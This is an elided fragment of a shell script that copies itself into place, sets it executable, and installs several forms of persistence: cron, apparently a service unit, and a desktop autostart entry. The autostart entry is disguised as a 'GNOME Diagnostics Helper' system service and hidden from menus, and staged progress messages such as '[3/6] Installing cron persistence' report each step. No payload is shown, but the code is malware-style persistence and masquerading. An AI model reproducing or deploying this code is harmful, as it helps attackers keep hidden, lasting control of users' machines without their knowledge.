...
if [ "$SELF" != "$DEPLOYED" ]; then
    ...
    echo ""
    echo "[2/6] Deploying script..."
    cp "$SELF" "$DEPLOYED"
    chmod 700 "$DEPLOYED"
    echo "[ OK ] $DEPLOYED"

    echo ""
    echo "[3/6] Installing cron persistence..."
...
SERVICE
    ...
    echo ""
    echo "[5/6] Installing autostart desktop entry..."
    AUTOSTART_DIR="$HOME/.config/autostart"
    AUTOSTART_FILE="$AUTOSTART_DIR/gnome-diagnostics-helper.desktop"
    mkdir -p "$AUTOSTART_DIR"
    cat > "$AUTOSTART_FILE" << DESKTOP
[Desktop Entry]
Type=Application
Name=GNOME Diagnostics Helper
Comment=System diagnostics background service
Exec=$DEPLOYED
Hidden=false
NoDisplay=true
...
DESKTOP
    ...
    [ -f "$AUTOSTART_FILE" ]         && echo "[ OK ] Autostart entry installed."         || echo "[FAIL] Autostart install failed."
